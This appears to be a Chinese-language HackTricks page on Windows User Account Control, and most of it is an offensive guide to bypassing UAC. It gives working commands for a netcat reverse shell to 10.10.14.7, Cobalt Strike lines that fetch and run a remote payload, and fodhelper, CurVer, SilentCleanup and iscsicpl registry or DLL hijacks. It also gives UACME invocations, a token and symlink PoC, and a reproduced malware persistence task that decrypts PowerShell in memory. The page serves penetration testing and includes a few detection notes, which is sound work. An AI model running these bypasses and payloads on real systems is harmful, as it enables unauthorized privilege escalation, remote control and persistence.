# UAC - User Account Control

{{#include ../../banners/hacktricks-training.md}}

## UAC

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) 是一项为**需要提升权限的活动提供同意提示**的功能。应用程序具有不同的 `integrity` 级别，而具有**高等级**的程序可以执行**可能危害系统**的任务。启用 UAC 后，应用程序和任务始终**在非管理员账户的安全上下文中运行**，除非管理员明确授权这些应用程序或任务获得管理员级别的系统访问权限并运行。它是一项保护管理员免受非预期更改影响的便利功能，但不被视为安全边界。<sup>[[2]](#references)</sup>

有关 integrity levels 的更多信息：


{{#ref}}
../windows-local-privilege-escalation/integrity-levels.md
{{#endref}}

启用 UAC 后，管理员用户会获得 2 个 token：一个标准用户 token，用于在 medium integrity 下执行常规操作；另一个 token 则包含 admin privileges。

此 [页面](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) 深入讨论了 UAC 的工作方式，包括 logon process、user experience 和 UAC architecture。<sup>[[2]](#references)</sup> 管理员可以使用 security policies，在本地配置 UAC 的组织级工作方式（使用 secpol.msc），也可以在 Active Directory domain environment 中通过 Group Policy Objects (GPO) 进行配置和推送。各种设置在[此处](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings)进行了详细讨论。UAC 有 10 个可设置的 Group Policy 设置。下表提供了更多详细信息：

| Group Policy Setting                                                                                                                                                                                                                                                                                                                                                           | Registry Key                | Default Setting                                              |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
| [User Account Control: 内置 Administrator 账户的 Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                                                                           | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\FilterAdministratorToken`   | `0` (Disabled)                                             |
| [User Account Control: Admin Approval Mode 中管理员的 elevation prompt 行为](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` | `5` (Prompt for consent for non-Windows binaries on the secure desktop) |
| [User Account Control: 标准用户的 elevation prompt 行为](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorUser`  | `1` (Prompt for credentials on the secure desktop)         |
| [User Account Control: 检测 application installations 并提示 elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                                                                 | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableInstallerDetection`   | `1` (Enabled; disabled by default on Enterprise)           |
| [User Account Control: 仅提升已签名并经过验证的 executables](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ValidateAdminCodeSignatures` | `0` (Disabled)                                             |
| [User Account Control: 仅提升安装在 secure locations 中的 UIAccess applications](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableSecureUIAPaths`       | `1` (Enabled)                                              |
| [User Account Control: 在 Admin Approval Mode 中运行所有 administrators](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                                                                            | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA`                  | `1` (Enabled)                                              |
| [User Account Control: 允许 UIAccess applications 在不使用 secure desktop 的情况下提示 elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop)                                   | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableUIADesktopToggle`     | `0` (Disabled)                                             |
| [User Account Control: 提示 elevation 时切换到 secure desktop](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                                               | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\PromptOnSecureDesktop`      | `1` (Enabled)                                              |
| [User Account Control: 将 file 和 registry write failures 虚拟化到 per-user locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableVirtualization`       | `1` (Enabled)                                              |

### 在 Windows 上安装 software 的 policies

**local security policies**（大多数系统上的 "secpol.msc"）默认配置为**阻止非管理员用户执行 software installations**。这意味着，即使非管理员用户可以下载 software 的 installer，他们也无法在没有 admin account 的情况下运行它。

### 强制 UAC 请求 elevation 的 Registry Keys

作为没有 admin rights 的标准用户，你可以确保当“standard”账户尝试执行某些操作时，UAC 会**提示输入 credentials**。此操作需要修改某些 **registry keys**，而修改这些 keys 需要 admin permissions，除非存在 **UAC bypass**，或者 attacker 已经以 admin 身份登录。

即使用户属于 **Administrators** group，这些更改也会强制用户**重新输入其 account credentials**，才能执行 administrative actions。

**在实践中，只有当你已经拥有 elevated token、UAC bypass，或存在允许你修改这些 keys 的 misconfiguration 时，此方法才有用；否则 registry write 本身会被阻止。**

必须更改的 registry keys 和 entries 如下（括号内为其默认值）：

- `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System`:
- `ConsentPromptBehaviorUser` = 1 (3)
- `ConsentPromptBehaviorAdmin` = 1 (5)
- `PromptOnSecureDesktop` = 1 (1)

也可以通过 Local Security Policy tool 手动完成。更改后，administrative operations 会提示用户重新输入其 credentials。

### 注意

**User Account Control 不是安全边界。**因此，标准用户无法脱离自己的账户并获得 administrator rights，除非使用 local privilege escalation exploit。

### 请求用户授予“full computer access”
```powershell
hostname | Set-Clipboard
Enable-PSRemoting -SkipNetworkProfileCheck -Force

cd C:\Users\hacedorderanas\Desktop
New-PSSession -Name "Case ID: 1527846" -ComputerName hostname
Enter-PSSession -ComputerName hostname
```
### UAC 权限

- Internet Explorer Protected Mode 使用完整性检查，防止高完整性级别的进程（如 Web 浏览器）访问低完整性级别的数据（如临时 Internet 文件夹）。这是通过使用低完整性令牌运行浏览器来实现的。当浏览器尝试访问存储在低完整性区域中的数据时，操作系统会检查进程的完整性级别，并据此允许访问。此功能有助于防止远程代码执行攻击获取系统上的敏感数据。
- 当用户登录 Windows 时，系统会创建一个访问令牌，其中包含用户权限列表。权限定义为用户权利和能力的组合。该令牌还包含用户凭据列表，这些凭据用于向计算机和网络上的资源验证用户身份。

### Autoadminlogon

要将 Windows 配置为在启动时自动登录特定用户，请设置 **`AutoAdminLogon` 注册表项**。这对 kiosk 环境或测试用途很有用。请仅在安全系统上使用，因为这会将密码暴露在注册表中。

使用注册表编辑器或 `reg add` 设置以下项：

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`：
- `AutoAdminLogon` = 1
- `DefaultUsername` = username
- `DefaultPassword` = password

要恢复正常的登录行为，请将 `AutoAdminLogon` 设置为 0。

## UAC bypass

> [!TIP]
> 请注意，如果你能以图形方式访问受害者的系统，那么 UAC bypass 非常简单，因为 UAC 提示出现时只需点击“Yes”即可。

在以下情况下需要进行 UAC bypass：**UAC 已启用，你的进程运行在中完整性上下文中，并且你的用户属于 administrators 组**。

需要指出的是，如果 UAC 处于最高安全级别（Always），其 bypass 难度会**远高于**处于其他任意级别（Default）时。

### 从中完整性 shell 快速分诊

在尝试 bypass 之前，确认自己处于正确的场景，并将主机版本映射到已知可用的方法：
```powershell
whoami /groups
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v PromptOnSecureDesktop
powershell -c "Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion' | select ProductName,DisplayVersion,CurrentBuild,UBR"
schtasks /Query /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup"
```
实用说明：
- 如果 `EnableLUA=0`，则不需要 bypass：任何 admin token 都可以直接请求 high integrity。
- `ConsentPromptBehaviorAdmin=2` 或 `5` 是 auto-elevate / 基于 COM 的 bypasses 的常见场景。
- `Always Notify` 会提高门槛，但仍应测试确切的 build，而不是假定会失败：UACME 仍在现代 Windows builds 上跟踪一些与 `AlwaysNotify compatible` 兼容的方法。<sup>[[3]](#references)</sup>

### UAC 已禁用

如果 UAC 已禁用（`ConsentPromptBehaviorAdmin` 为 **`0`**），则可以使用类似以下方式，**以 admin privileges 执行 reverse shell**（high integrity level）：
```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```
#### 使用 token duplication 绕过 UAC

- [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
- [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### **非常**基础的 UAC“绕过”（完整文件系统访问权限）

如果你拥有一个属于 Administrators 组的用户 shell，则可以通过 SMB 将本地的 **C$** 共享（文件系统）挂载到一个新磁盘中，这样你将拥有**文件系统内所有内容的访问权限**（甚至包括 Administrator 的主文件夹）。

> [!WARNING]
> **看起来这个技巧已经不再有效了**
```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```
### 使用 cobalt strike 绕过 UAC

Cobalt Strike 技术仅在 UAC 未设置为最高安全级别时有效
```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```
**Empire** 和 **Metasploit** 也包含多个用于 **bypass** **UAC** 的模块。

### Elevated COM interfaces (`ICMLuaUtil` / `CMSTPLUA`)

在现代 Windows 构建版本中，自动提升权限的 COM 对象仍然是实用的 UAC 攻击面。UACME 仍将 `ICMLuaUtil` 记录为当前 Windows 分支上可用的方法，而 offensive tooling 也在持续调整 `CMSTPLUA`，通过结合交互式桌面进程、64-bit 执行，有时还包括 PEB/process masquerading，然后调用 COM Elevation Moniker。<sup>[[3]](#references)</sup>

实用提示：
- 优先选择用户 **interactive session** 中的 **64-bit** 进程（通常是 `explorer.exe` 或其子进程）。
- 如果 raw shell 失败，请改用 BOF / UACME 实现重试，而不是使用简单的 `CreateProcess` wrapper。
- 预期子进程会在**独立的 elevated process** 中执行；许多 BOF 不会将当前 beacon 原地提升。

### KRBUACBypass

Documentation and tool 位于 [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)

### UAC bypass exploits

[**UACME**](https://github.com/hfiref0x/UACME) 是一个 UAC bypass 技术集合。使用 Visual Studio 或 MSBuild 编译；构建过程会创建多个可执行文件（例如 `Source\Akagi\output\x64\Debug\Akagi.exe`），因此应选择适用于目标构建版本的方法。<sup>[[3]](#references)</sup>\
请注意：某些 bypass 会启动可见程序或提示，从而提醒用户。<sup>[[3]](#references)</sup>

UACME 提供了每种技术开始工作的 **build version**。<sup>[[3]](#references)</sup> 你可以搜索影响自身版本的技术：
```powershell
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```
此外，使用[此页面](https://en.wikipedia.org/wiki/Windows_10_version_history)可以根据 build 版本获取 Windows release `1607`。

实用的工作流程是先**评估主机 build**，然后再执行匹配的方法：
```cmd
python main.py --scan uac
Akagi64.exe 33 C:\Windows\System32\cmd.exe
```
- `WinPwnage` 会快速将本地 build 与其已知的 UAC methods 进行比较，这有助于快速排除失效的 PoC。<sup>[[4]](#references)</sup>
- `UACME` 仍是将 bypass 映射到精确 build 的最佳公开目录。3.7.1 版本新增了 methods 83–85，而前一个版本则针对 **Windows 11 25H2** 重新测试了现有 methods；请重新检查 method table 和 release notes，不要假设旧 PoC 仍可直接适用。<sup>[[3]](#references)[[9]](#references)</sup>

### Always Notify-capable WNF/UIAccess chains (UACME 3.7.1)

`Always Notify` 并不会消除所有 UAC bypass。UACME 3.7.1 实现了三种新的 x64 methods，它们将用户可控的环境变量/协议状态与 elevated scheduled-task 或 UIAccess 行为结合起来，并将全部标记为 `AlwaysNotify compatible`：<sup>[[3]](#references)[[9]](#references)</sup>

- **83 — UnifiedConsent：** 重定向 `SystemRoot`，使 WNF-triggered `\Microsoft\Windows\ConsentUX\UnifiedConsent\UnifiedConsentSyncTask` 让 elevated `taskhostw.exe` 对 `unifiedconsent.dll` 执行 side-load。UACME 从 Windows 10 build 19041 开始对其进行跟踪。
- **84 — TabTip：** 对 UIAccess `TabTip.exe` 使用相同的环境变量 primitive。根据 build 的不同，它会加载 `windows.storage.dll`、`ApplicationTargetedFeatureDatabase.dll` 或 `rsaenh.dll`，然后从生成的 high-integrity UIAccess context 进行 pivot。UACME 从 Windows 8.1 / Server 2016 开始对其进行跟踪。
- **85 — Narrator：** 劫持每用户的 `feedback-hub` protocol，使用 `Alt+CapsLock+F` 驱动 Narrator，然后启动一个可写副本 `osk.exe`，该副本会对 `OskSupport.dll` 执行 side-load。此方法要求使用 interactive desktop，并从 Windows 10 1809 / Server 2019 开始进行跟踪。

按照 UACME 的文档构建 payload units 和 Akagi 后，调用对应的 method number（可选命令默认为 `cmd.exe`）：
```cmd
Akagi64.exe 83 C:\Windows\System32\cmd.exe
Akagi64.exe 84 C:\Windows\System32\cmd.exe
Akagi64.exe 85 C:\Windows\System32\cmd.exe
```
Methods 84 和 85 依赖 UIAccess/desktop interaction，因此不要指望它们在 Session 0 或非交互式 service shell 中原样工作。三者都会操纵 environment/protocol state 并 staging DLLs；测试后请检查实现并移除这些 artifacts。<sup>[[3]](#references)[[9]](#references)</sup>

### UAC Bypass – fodhelper.exe (Registry hijack)

受信任的 binary `fodhelper.exe` 在现代 Windows 上会自动提升权限。启动后，它会查询下面的 per-user registry path，但不会验证 `DelegateExecute` verb。在该位置植入 command，可以让 Medium Integrity process（用户属于 Administrators 组）在无需 UAC prompt 的情况下 spawn High Integrity process。

fodhelper 查询的 Registry path：
```text
HKCU\Software\Classes\ms-settings\Shell\Open\command
```
<details>
<summary>PowerShell 步骤（设置你的 payload，然后触发）</summary>
```powershell
# Optional: from a 32-bit shell on 64-bit Windows, spawn a 64-bit PowerShell for stability
C:\\Windows\\sysnative\\WindowsPowerShell\\v1.0\\powershell -nop -w hidden -c "$PSVersionTable.PSEdition"

# 1) Create the vulnerable key and values
New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force | Out-Null

# 2) Set default command to your payload (example: reverse shell or cmd)
# Replace <BASE64_PS> with your base64-encoded PowerShell (or any command)
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -e <BASE64_PS>" -Force

# 3) Trigger auto-elevation
Start-Process -FilePath "C:\\Windows\\System32\\fodhelper.exe"

# 4) (Recommended) Cleanup
Remove-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open" -Recurse -Force
```
</details>
注意：
- 当前用户属于 Administrators，且 UAC level 为 default/lenient 时有效（不是 Always Notify with extra restrictions）。
- 在 64 位 Windows 上，使用 `sysnative` 路径从 32 位进程启动 64 位 PowerShell。
- Payload 可以是任意 command（PowerShell、cmd 或 EXE 路径）。为保持 stealth，应避免触发提示 UI。

#### CurVer/extension hijack variant（仅 HKCU）

近期滥用 `fodhelper.exe` 的样本会避开 `DelegateExecute`，转而通过 per-user `CurVer` value **redirect `ms-settings` ProgID**。该 auto-elevated binary 仍会在 `HKCU` 下解析 handler，因此无需 admin token 即可植入这些 keys：<sup>[[5]](#references)</sup>
```powershell
# Point ms-settings to a custom extension (.thm) and map that extension to our payload
New-Item -Path "HKCU:\Software\Classes\.thm\Shell\Open" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\.thm\Shell\Open\command" -Name "(default)" -Value "C:\\ProgramData\\rKXujm.exe" -Force | Out-Null
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings" -Name "CurVer" -Value ".thm" -Force

Start-Process "C:\\Windows\\System32\\fodhelper.exe"   # auto-elevates and runs rKXujm.exe
```
提权后，malware 通常会通过将 `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` 设置为 `0` 来**禁用后续提示**，然后执行额外的 defense evasion（例如 `Add-MpPreference -ExclusionPath C:\ProgramData`），并重新创建 persistence，使其以 high integrity 运行。典型的 persistence task 会将 **XOR-encrypted PowerShell script** 存储在磁盘上，并每小时在内存中解码和执行：<sup>[[5]](#references)</sup>
```powershell
schtasks /create /sc hourly /tn "OneDrive Startup Task" /rl highest /tr "cmd /c powershell -w hidden $d=[IO.File]::ReadAllBytes('C:\ProgramData\VljE\zVJs.ps1');$k=[Text.Encoding]::UTF8.GetBytes('Q');for($i=0;$i -lt $d.Length;$i++){$d[$i]=$d[$i]-bxor$k[$i%$k.Length]};iex ([Text.Encoding]::UTF8.GetString($d))"
```
此变体仍会清理 dropper，只留下 staged payloads，因此检测需要依赖监控 **`CurVer` hijack**、`ConsentPromptBehaviorAdmin` 篡改、Defender exclusion 创建，或在内存中解密 PowerShell 的 scheduled tasks。<sup>[[5]](#references)</sup>

### 通过 `SilentCleanup` task（`HKCU\Environment\windir`）绕过 UAC

`SilentCleanup` 会以最高权限启动 `cleanmgr.exe`，并从用户环境中展开 `%windir%`。如果你能控制 `HKCU\Environment\windir`，就可以将该展开过程重定向到任意命令，从而在不显示 consent dialog 的情况下获得 high integrity。<sup>[[8]](#references)</sup>由于 UACME 仍保持该技术处于 active 状态，且近期 issue tracking 表明 Windows 11 24H2 可能只需要进行少量引号调整，因此该方法在近期版本上仍值得测试。<sup>[[3]](#references)</sup>
```cmd
reg add "HKCU\Environment" /v windir /d "cmd.exe /c start powershell.exe" /f
schtasks /Run /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup"
reg delete "HKCU\Environment" /v windir /f
```
If 该 build 上的任务会引用该路径，请重试，并让 payload 以引号结尾（例如 `cmd.exe"`）。测试完成后，务必清理 `HKCU\Environment\windir`。

#### 更多 UAC bypass

许多利用 UI 流程、COM 对象或桌面交互的经典 UAC bypass 都要求受害者拥有**完整的交互式会话**；常见的 `nc.exe` shell 或运行在 **Session 0** 中的服务通常不够用。

通常可以使用 **meterpreter** session 解决这一问题。迁移到 **Session** 值等于 **1** 的**进程**：

![将 ms-settings 指向自定义扩展名（.thm），并将该扩展名映射到我们的 payload - 更多 UAC bypass：你可以使用 meterpreter session。迁移到 Session...](<../../images/image (863).png>)

(_explorer.exe_ 应该可以工作)

### 使用 GUI 进行 UAC Bypass

如果你可以访问 **GUI**，那么出现 UAC 提示时直接接受即可；实际上并不需要技术性的 bypass。因此，获取 GUI session 通常就足以绕过 UAC 带来的实际阻碍。

此外，如果你获取的是某人正在使用的 GUI session（可能通过 RDP），其中可能有**一些工具会以 administrator 身份运行**，你可以直接从这些工具中**运行**一个 **cmd**，例如直接**以 admin 身份运行**，而不会再次收到 UAC 提示，例如 [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif)。这种方式可能更加**隐蔽**。

### 高噪声的暴力破解 UAC bypass

如果可以接受噪声，可以使用 [**ForceAdmin**](https://github.com/Chainski/ForceAdmin) 之类的工具反复请求提权，直到用户接受。

### 自己的 bypass - Basic UAC bypass methodology

查看 **UACME** 时，你会注意到**许多 UAC bypass 都利用 DLL hijacking**（通常是让一个已提权的 binary 从可写路径加载攻击者控制的 DLL）。[阅读此处，了解如何寻找 DLL hijacking vulnerability](../windows-local-privilege-escalation/dll-hijacking/index.html)。

1. 找到一个会**自动提权**的 binary（检查执行时它是否以 high integrity level 运行）。
2. 使用 procmon 查找可能受到 **DLL Hijacking** 影响的 "**NAME NOT FOUND**" 事件。
3. 你可能需要将 DLL **写入**某些**受保护路径**（例如 C:\Windows\System32），而你没有写入权限。可以使用以下方法绕过：
1. **wusa.exe**：Windows 7、8 和 8.1。它允许将 CAB 文件的内容提取到受保护路径中（因为该工具以 high integrity level 执行）。
2. **IFileOperation**：Windows 10。
4. 准备一个**脚本**，将 DLL 复制到受保护路径中，并执行存在漏洞且会自动提权的 binary。

### 另一种 UAC bypass 技术

其原理是监视某个**autoElevated binary** 是否尝试从**registry**中读取要**执行**的 **binary** 或**命令**的**名称/路径**（如果该 binary 在 **HKCU** 中搜索此信息，则更值得关注）。

### 通过 `SysWOW64\iscsicpl.exe` + 用户 `PATH` DLL hijack 实现 UAC bypass

32 位的 `C:\Windows\SysWOW64\iscsicpl.exe` 是一个**自动提权**的 binary，可以通过搜索顺序加载 `iscsiexe.dll`。如果你能将恶意的 `iscsiexe.dll` 放入**用户可写**文件夹，然后修改当前用户的 `PATH`（例如通过 `HKCU\Environment\Path`），使该文件夹被搜索到，Windows 可能会在已提权的 `iscsicpl.exe` 进程中加载攻击者 DLL，且**不会显示 UAC 提示**。<sup>[[1]](#references)[[6]](#references)</sup>

实际注意事项：
- 当前用户属于 **Administrators**，但由于 UAC 以 **Medium Integrity** 运行时，这种方法很有用。
- 对于此 bypass，相关的是 **SysWOW64** 副本。将 **System32** 副本视为独立的 binary，并单独验证其行为。
- 该 primitive 结合了**自动提权**和 **DLL search-order hijacking**，因此，其他 UAC bypass 使用的相同 ProcMon 工作流也适合用于验证缺失 DLL 的加载。

最小流程：
```cmd
copy iscsiexe.dll %TEMP%\iscsiexe.dll
reg add "HKCU\Environment" /v Path /t REG_SZ /d "%TEMP%" /f
C:\Windows\System32\cmd.exe /c C:\Windows\SysWOW64\iscsicpl.exe
```
检测思路：
- 监控 `reg add` / 对 `HKCU\Environment\Path` 的注册表写入，随后立即执行 `C:\Windows\SysWOW64\iscsicpl.exe` 的行为。
- 在 `%TEMP%` 或 `%LOCALAPPDATA%\Microsoft\WindowsApps` 等**用户可控**位置查找 `iscsiexe.dll`。
- 将 `iscsicpl.exe` 的启动与异常子进程，或从正常 Windows 目录之外加载的 DLL 进行关联分析。

### 值得单独检查的较新研究

一些 2024 年之后的 chain 已不再呈现经典的 `HKCU\Software\Classes` 注册表劫持特征。例如，activation-context cache poisoning 可以将 **drive remap** 与 **DLL redirection** 串联起来，通过 `ctfmon.exe` 以及后续的 `fodhelper.exe` 等受信任的 UI / auto-elevated binaries，将 medium integrity 提升至 high integrity。这里不重复大型 PoC，请查看以下位置中的精简 payload 示例：

{{#ref}}
../windows-local-privilege-escalation/windows-c-payloads.md
{{#endref}}

### Administrator Protection（preview）通过每个 logon session 的 DOS device map 进行 drive-letter hijack

> [!NOTE]
> 截至 2026 年 8 月，Microsoft 仍将 Administrator Protection 记录为 **Insider preview**：2025 年 10 月的 rollout 已被回滚，并计划在之后重新推出。在测试这些 chain 前，请确认 **Admin Approval Mode with Administrator protection** 确实已启用，并且设备已经重启；仅凭 stock 25H2 version string 无法证明该 feature 处于 active 状态。<sup>[[10]](#references)</sup>

有关 Windows 11 25H2 preview builds 中完整的 `RAiLaunchAdminProcess` / UIAccess attack surface，请查看专门页面：

{{#ref}}
../windows-local-privilege-escalation/uiaccess-admin-protection-bypass.md
{{#endref}}

Windows 11 25H2 的 “Administrator Protection” 使用带有每个 session 独立 `\Sessions\0\DosDevices/<LUID>` map 的 shadow-admin tokens。该目录由 `SeGetTokenDeviceMap` 在首次解析 `\??` 时 lazy 创建。如果攻击者仅以 **SecurityIdentification** impersonate shadow-admin token，则该目录会以攻击者为 **owner** 创建（继承 `CREATOR OWNER`），从而允许创建优先于 `\GLOBAL??` 的 drive-letter links。<sup>[[7]](#references)</sup>

**步骤：**

1. 在低权限 session 中调用 `RAiProcessRunOnce`，spawn 一个无提示的 shadow-admin `runonce.exe`。
2. 将其 primary token duplicate 为 **identification** token，并在打开 `\??` 时 impersonate 该 token，以强制在攻击者所有权下创建 `\Sessions\0\DosDevices/<LUID>`。
3. 在其中创建一个指向攻击者控制存储位置的 `C:` symlink；之后该 session 中的 filesystem accesses 会将 `C:` 解析到攻击者路径，从而无需提示即可实现 DLL/file hijack。

**PowerShell PoC（NtObjectManager）：**
```powershell
$pid = Invoke-RAiProcessRunOnce
$p = Get-Process -Id $pid
$t = Get-NtToken -Process $p
$id = New-NtTokenDuplicate -Token $t -ImpersonationLevel Identification
Invoke-NtToken $id -ImpersonationLevel Identification { Get-NtDirectory "\??" | Out-Null }
$auth = Get-NtTokenId -Authentication -Token $id
New-NtSymbolicLink "\Sessions\0\DosDevices/$auth/C:" "\??\\C:\\Users\\attacker\\loot"
```
在预览主机上，Administrator Protection 会在 `Microsoft-Windows-LUA` provider 下，将批准和失败记录为 ETW 事件 **15031** 和 **15032**。这些事件包含请求方 SID、应用程序路径、结果、受管理的管理员帐户和身份验证方法，因此，重复的 exploit 尝试或失败的 UI 操作并非没有 telemetry。<sup>[[10]](#references)</sup>
```cmd
logman start AdminProtectionTrace -p {93c05d69-51a3-485e-877f-1806a8731346} -ets
rem reproduce the elevation attempt
logman stop AdminProtectionTrace -ets
```
## References

- [1] [LOLBAS: Iscsicpl.exe](https://lolbas-project.github.io/lolbas/Binaries/Iscsicpl/)
- [2] [Microsoft Docs – User Account Control 工作原理](https://learn.microsoft.com/windows/security/identity-protection/user-account-control/how-user-account-control-works)
- [3] [UACME – UAC bypass 技术集合](https://github.com/hfiref0x/UACME)
- [4] [WinPwnage – UAC bypass 兼容性扫描器和启动器](https://github.com/rootm0s/WinPwnage)
- [5] [Checkpoint Research – KONNI 采用 AI 生成 PowerShell 后门](https://research.checkpoint.com/2026/konni-targets-developers-with-ai-malware/)
- [6] [Check Point Research – Operation TrueChaos：针对东南亚政府目标的 0-Day exploitation](https://research.checkpoint.com/2026/operation-truechaos-0-day-exploitation-against-southeast-asian-government-targets/)
- [7] [Project Zero – 绕过 Windows Administrator Protection](https://projectzero.google/2026/26/windows-administrator-protection.html)
- [8] [Sigma / Detection.FYI – 使用 SilentCleanup Task 绕过 UAC](https://detection.fyi/sigmahq/sigma/windows/registry/registry_set/registry_set_bypass_uac_using_silentcleanup_task/)
- [9] [R41N3RZUF477 – UnifiedConsent、TabTip 和 Narrator Always Notify bypasses](https://github.com/hfiref0x/UACME/issues/173)
- [10] [Microsoft Learn – Administrator protection](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/administrator-protection/)
{{#include ../../banners/hacktricks-training.md}}
